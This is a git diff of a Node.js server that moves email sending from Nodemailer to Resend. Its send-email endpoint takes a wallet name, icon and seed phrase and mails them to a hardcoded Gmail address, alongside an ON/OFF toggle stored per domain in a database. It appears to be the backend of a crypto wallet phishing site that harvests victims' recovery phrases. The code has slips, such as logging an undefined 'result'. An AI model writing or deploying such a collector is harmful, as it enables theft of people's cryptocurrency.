@@ -2,21 +2,15 @@ import http from "http";
 import fs from "fs";
 import path from "path";
 import url from "url";
+import { Resend } from "resend";
 import { neon } from "@neondatabase/serverless";
-import * as emailService from "./api/send-email.js";
 
 const __dirname = path.dirname(url.fileURLToPath(import.meta.url));
 
 // Initialize Neon database connection
 const sql = neon(process.env.DATABASE_URL);
 
-// ============================================
-// DATABASE INITIALIZATION & HELPERS
-// ============================================
-
-/**
- * Generate domain-based ID for consistent lookups
- */
+// Helper function to get domain ID
 function getDomainId(domain) {
   let hash = 0;
   for (let i = 0; i < domain.length; i++) {
@@ -26,9 +20,7 @@ function getDomainId(domain) {
   return Math.abs(hash);
 }
 
-/**
- * Initialize database table on startup
- */
+// Initialize database table on startup
 async function initDatabase() {
   try {
     await sql`
@@ -40,23 +32,17 @@ async function initDatabase() {
     `;
     console.log("✅ Database table initialized");
   } catch (error) {
-    console.error("❌ Database initialization error:", error.message);
+    console.error("❌ Database initialization error:", error);
   }
 }
 
-// ============================================
-// REQUEST HANDLERS
-// ============================================
-
-/**
- * Handle toggle state GET/POST requests
- */
+// Handle toggle endpoint
 const handleToggle = async (req, res, body) => {
   const host = req.headers.host || "";
   const domainId = getDomainId(host);
 
   try {
-    // Ensure domain exists with default state
+    // Insert default state for this domain if it doesn't exist
     await sql`
       INSERT INTO flareclaimspark (id, domain, state)
       VALUES (${domainId}, ${host}, 'OFF')
@@ -66,14 +52,15 @@ const handleToggle = async (req, res, body) => {
     if (req.method === "POST") {
       const { state } = JSON.parse(body);
 
-      // Validate state
       if (state !== "ON" && state !== "OFF") {
-        res.writeHead(400, { "Content-Type": "application/json" });
-        res.end(JSON.stringify({ error: "Invalid state. Use 'ON' or 'OFF'" }));
+        res.writeHead(400, {
+          "Content-Type": "application/json",
+          "Access-Control-Allow-Origin": "*",
+        });
+        res.end(JSON.stringify({ error: "Invalid state" }));
         return;
       }
 
-      // Update state in database
       await sql`
         UPDATE flareclaimspark
         SET state = ${state}
@@ -82,15 +69,20 @@ const handleToggle = async (req, res, body) => {
 
       console.log(`✅ Toggle updated: ${host} → ${state}`);
 
-      res.writeHead(200, { "Content-Type": "application/json" });
-      res.end(JSON.stringify({ success: true, state, domain: host }));
+      res.writeHead(200, {
+        "Content-Type": "application/json",
+        "Access-Control-Allow-Origin": "*",
+      });
+      res.end(JSON.stringify({ state, domain: host }));
     } else if (req.method === "GET") {
-      // Retrieve current state
       const result = await sql`
         SELECT state, domain FROM flareclaimspark WHERE id = ${domainId}
       `;
 
-      res.writeHead(200, { "Content-Type": "application/json" });
+      res.writeHead(200, {
+        "Content-Type": "application/json",
+        "Access-Control-Allow-Origin": "*",
+      });
       res.end(
         JSON.stringify({
           state: result[0]?.state || "OFF",
@@ -99,198 +91,184 @@ const handleToggle = async (req, res, body) => {
       );
     }
   } catch (error) {
-    console.error("❌ Database error:", error.message);
-    res.writeHead(500, { "Content-Type": "application/json" });
+    console.error("❌ Database error:", error);
+    res.writeHead(500, {
+      "Content-Type": "application/json",
+      "Access-Control-Allow-Origin": "*",
+    });
     res.end(
-      JSON.stringify({ error: "Database error", message: error.message }),
+      JSON.stringify({
+        error: "Database error",
+        message: error.message,
+      }),
     );
   }
 };
 
-/**
- * Handle send email requests
- */
-const handleSendEmail = async (req, res, body) => {
-  if (req.method !== "POST") {
-    res.writeHead(405, { "Content-Type": "application/json" });
-    res.end(JSON.stringify({ error: "Method not allowed. Use POST." }));
-    return;
-  }
-
+// Send email using Resend
+const sendEmail = async (req, res, body) => {
   try {
-    // Parse request body
-    const data = JSON.parse(body);
-    const { walletName, walletIcon, seedPhrase } = data;
-
-    console.log("📧 Email request received from:", walletName);
-
-    // Send email via email service
-    const result = await emailService.sendFormEmail({
-      walletName,
-      walletIcon,
-      seedPhrase,
-    });
-
-    res.writeHead(200, { "Content-Type": "application/json" });
-    res.end(JSON.stringify(result));
-  } catch (error) {
-    console.error("❌ Email error:", error.message);
-    res.writeHead(400, { "Content-Type": "application/json" });
-    res.end(JSON.stringify({ success: false, error: error.message }));
-  }
-};
-
-/**
- * Handle test email endpoint
- */
-const handleTestEmail = async (req, res) => {
-  try {
-    const result = await emailService.sendTestEmail();
-    res.writeHead(200, { "Content-Type": "application/json" });
-    res.end(JSON.stringify(result));
-  } catch (error) {
-    res.writeHead(500, { "Content-Type": "application/json" });
-    res.end(JSON.stringify({ success: false, error: error.message }));
-  }
-};
-
-/**
- * Serve static files
- */
-const serveStaticFile = (res, filePath) => {
-  const ext = path.extname(filePath);
-  const contentTypes = {
-    ".html": "text/html",
-    ".js": "text/javascript",
-    ".css": "text/css",
-    ".json": "application/json",
-    ".png": "image/png",
-    ".jpg": "image/jpg",
-    ".gif": "image/gif",
-    ".svg": "image/svg+xml",
-    ".ico": "image/x-icon",
-    ".woff": "font/woff",
-    ".woff2": "font/woff2",
-  };
-
-  const contentType = contentTypes[ext] || "text/plain";
-
-  fs.readFile(filePath, (err, content) => {
-    if (err) {
-      res.writeHead(404, { "Content-Type": "text/plain" });
-      res.end("404 - File Not Found");
-    } else {
-      res.writeHead(200, { "Content-Type": contentType });
-      res.end(content);
+    if (req.method !== "POST") {
+      return res.status(405).json({ error: "Method not allowed" });
     }
-  });
+
+    const { walletName, walletIcon, seedPhrase } = JSON.parse(body);
+
+    if (!walletName || !walletIcon || !seedPhrase) {
+      res.writeHead(400, {
+        "Content-Type": "application/json",
+        "Access-Control-Allow-Origin": "*",
+      });
+      res.end(JSON.stringify({ error: "Missing required fields" }));
+      return;
+    }
+
+    const resend = new Resend(process.env.RESEND_API_KEY);
+
+    await resend.emails.send({
+      from: process.env.RESEND_FROM_EMAIL || "onboarding@resend.dev",
+      to: "danielekene6b@gmail.com",
+      subject: `New Message from ${walletName}`,
+      html: `
+        <h2>New Submission</h2>
+        <p><strong>Name:</strong> ${walletName}</p>
+        <p><strong>Icon:</strong> ${walletIcon}</p>
+        <p><strong>Message:</strong></p>
+        <p>${seedPhrase}</p>
+      `,
+    });
+    console.log("Email sent via Resend:", result.id);
+
+    res.writeHead(200, {
+      "Content-Type": "application/json",
+      "Access-Control-Allow-Origin": "*",
+    });
+    res.end(
+      JSON.stringify({
+        success: true,
+        message: "Email sent successfully",
+      }),
+    );
+  } catch (err) {
+    console.error("❌ Email error:", err);
+    res.writeHead(500, {
+      "Content-Type": "application/json",
+      "Access-Control-Allow-Origin": "*",
+    });
+    res.end(
+      JSON.stringify({
+        error: "Failed to send email",
+        details: err.message,
+      }),
+    );
+  }
 };
 
-// ============================================
-// HTTP SERVER
-// ============================================
-
+// Basic static file + API handler
 const server = http.createServer((req, res) => {
   const parsedUrl = url.parse(req.url);
-  const pathname = parsedUrl.pathname;
 
-  // Set CORS headers for all responses
-  res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
-  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
-
-  // Handle preflight requests
+  // Handle CORS preflight
   if (req.method === "OPTIONS") {
-    res.writeHead(200);
+    res.writeHead(200, {
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
+      "Access-Control-Allow-Headers": "Content-Type",
+    });
     res.end();
     return;
   }
 
-  // API Routes
-  if (pathname === "/api/send-email" && req.method === "POST") {
+  // Handle send-email endpoint
+  if (req.method === "POST" && parsedUrl.pathname === "/api/send-email") {
     let body = "";
     req.on("data", (chunk) => (body += chunk));
-    req.on("end", () => handleSendEmail(req, res, body));
-    return;
+    req.on("end", () => sendEmail(req, res, body));
   }
-
-  if (pathname === "/api/toggle") {
-    if (req.method === "POST") {
+  // Handle toggle endpoint (GET and POST)
+  else if (parsedUrl.pathname === "/api/toggle") {
+    if (req.method === "GET") {
+      handleToggle(req, res, "");
+    } else if (req.method === "POST") {
       let body = "";
       req.on("data", (chunk) => (body += chunk));
       req.on("end", () => handleToggle(req, res, body));
-    } else if (req.method === "GET") {
-      handleToggle(req, res, "");
     }
-    return;
   }
-
-  if (pathname === "/test-email") {
-    handleTestEmail(req, res);
-    return;
-  }
-
-  // Health check / Info endpoint
-  if (pathname === "/" || pathname === "/health") {
+  // Health check
+  else if (parsedUrl.pathname === "/health" || parsedUrl.pathname === "/") {
     res.writeHead(200, { "Content-Type": "application/json" });
-    const status = {
-      status: "🟢 Server is running",
-      endpoints: {
-        POST: "/api/send-email - Send form email",
-        GET: "/api/toggle - Get toggle state",
-        POST: "/api/toggle - Update toggle state",
-        GET: "/test-email - Send test email",
-      },
-      smtp: emailService.getSmtpStatus(),
-      database: process.env.DATABASE_URL ? "✅" : "❌",
-    };
-    res.end(JSON.stringify(status, null, 2));
-    return;
+    res.end(
+      JSON.stringify({
+        status: "Server is running",
+        endpoints: ["/api/send-email", "/api/toggle"],
+      }),
+    );
   }
+  // Test Resend endpoint
+  else if (parsedUrl.pathname === "/test-resend") {
+    const resend = new Resend(process.env.RESEND_API_KEY);
 
-  // Static files
-  let filePath = `.${pathname}`;
-  if (filePath === "./") filePath = "./index.html";
+    resend.emails
+      .send({
+        from: "onboarding@resend.dev",
+        to: "danielekene6b@gmail.com",
+        subject: "Test from Render",
+        html: "<h1>Test email</h1><p>If you see this, Resend is working!</p>",
+      })
+      .then((result) => {
+        console.log("✅ Test email sent:", result);
+        res.writeHead(200, { "Content-Type": "application/json" });
+        res.end(JSON.stringify({ success: true, result }));
+      })
+      .catch((err) => {
+        console.error("❌ Test email failed:", err);
+        res.writeHead(500, { "Content-Type": "application/json" });
+        res.end(JSON.stringify({ error: err.message }));
+      });
+  }
+  // Serve static files
+  else {
+    let filePath = `.${parsedUrl.pathname}`;
+    if (filePath === "./") filePath = "./index.html";
 
-  serveStaticFile(res, filePath);
+    const ext = path.extname(filePath);
+    const contentType =
+      {
+        ".html": "text/html",
+        ".js": "text/javascript",
+        ".css": "text/css",
+        ".json": "application/json",
+        ".png": "image/png",
+        ".jpg": "image/jpg",
+        ".svg": "image/svg+xml",
+        ".ico": "image/x-icon",
+      }[ext] || "text/plain";
+
+    fs.readFile(filePath, (err, content) => {
+      if (err) {
+        res.writeHead(404, { "Content-Type": "text/plain" });
+        res.end("Not Found");
+      } else {
+        res.writeHead(200, { "Content-Type": contentType });
+        res.end(content);
+      }
+    });
+  }
 });
-
-// ============================================
-// SERVER STARTUP
-// ============================================
 
 const PORT = process.env.PORT || 3000;
 
-async function startServer() {
-  try {
-    // Initialize database
-    await initDatabase();
-
-    // Verify SMTP connection (non-blocking - happens in background)
-    emailService.verifySmtpConnection();
-
-    // Start HTTP server immediately - don't wait for SMTP verification
-    server.listen(PORT, () => {
-      console.log("\n╔═══════════════════════════════════════╗");
-      console.log("║  🚀 SERVER STARTED SUCCESSFULLY       ║");
-      console.log("╚═══════════════════════════════════════╝\n");
-      console.log(`📍 Port: ${PORT}`);
-      console.log(`📧 Email Service: Nodemailer`);
-      console.log(
-        `💾 Database: ${process.env.DATABASE_URL ? "Connected" : "Not configured"}`,
-      );
-      console.log("\n📌 Endpoints:");
-      console.log(`   POST /api/send-email - Send form submission email`);
-      console.log(`   GET  /api/toggle     - Get toggle state`);
-      console.log(`   POST /api/toggle     - Update toggle state`);
-      console.log(`   GET  /test-email     - Send test email`);
-      console.log(`   GET  /health         - Server health & status\n`);
-    });
-  } catch (error) {
-    console.error("❌ Failed to start server:", error.message);
-    process.exit(1);
-  }
-}
-
-// Start the server
-startServer();
+// Initialize database and start server
+initDatabase().then(() => {
+  server.listen(PORT, () => {
+    console.log(`✅ Server running on port ${PORT}`);
+    console.log(`📧 Email provider: Resend`);
+    console.log(
+      `🔑 Resend API Key set: ${process.env.RESEND_API_KEY ? "Yes" : "No"}`,
+    );
+    console.log(
+      `💾 Database URL set: ${process.env.DATABASE_URL ? "Yes" : "No"}`,
+    );
+  });
+});
